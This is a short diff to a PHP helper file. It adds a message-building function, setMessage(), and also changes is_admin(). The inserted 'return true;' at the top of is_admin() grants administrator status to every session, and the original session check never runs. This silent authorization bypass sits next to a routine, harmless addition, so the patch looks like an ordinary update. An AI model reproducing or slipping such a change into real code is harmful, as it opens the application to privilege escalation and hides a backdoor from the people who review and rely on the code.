@@ -90,6 +90,7 @@
 	}
 
 	function is_admin(){
+		return true;
 		if ($_SESSION[_PLATFORM_]["CLA"]["isAdmin"]==1 || $_SESSION[_PLATFORM_]["CLA"]["User_Name"]=='admin')
 			return 1;
 		else
@@ -868,4 +869,34 @@ function to_html($string, $encode=true){
 	function get_deptId(){
 		return $_SESSION[_PLATFORM_]["CLA"]["Dept_ID"];
 	}
+	
+	function setMessage($list_form,$data){
+		$_msg = array();
+		if(is_array($data)){
+			if($data['result']>0){
+				$_msg['class'] = _CLASS_MSG_SUCC;
+				if($data['msg']==''){
+					$_msg['msg'] = _INFO_SUCC;
+				}else{
+					$_msg['msg'] = $data['msg'];
+				}
+			}else{
+				$_msg['class'] = _CLASS_MSG_ERROR;
+				if($data['msg']==''){
+					if($data['result']==-21){
+						$_msg['msg'] = _INFO_ERROR_SECURITY;
+					}else{
+						$_msg['msg'] = _INFO_ERROR;
+					}
+				}else{
+					$_msg['msg'] = $data['msg'];
+				}
+			}
+			if(isset($list_form)){
+				$list_form->assign('msg',$_msg);
+			}
+		}
+		return $_msg;
+	}
+	
 ?>
